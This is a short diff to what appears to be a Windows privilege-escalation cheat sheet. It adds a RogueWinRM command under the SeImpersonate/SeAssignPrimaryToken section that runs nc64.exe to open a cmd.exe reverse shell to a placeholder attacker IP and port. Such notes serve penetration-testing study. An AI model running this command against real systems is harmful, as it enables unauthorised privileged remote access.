@@ -668,3 +668,6 @@ Then lock the screen and use the cmd running as system user
 
 ### SeImpersonate / SeAssignPrimaryToken
 These privileges allow a process to impersonate other users and act on their behalf. <br>
+Use RogueWinRM 
+
+    c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe <ATTACKER_IP> <PORT>"
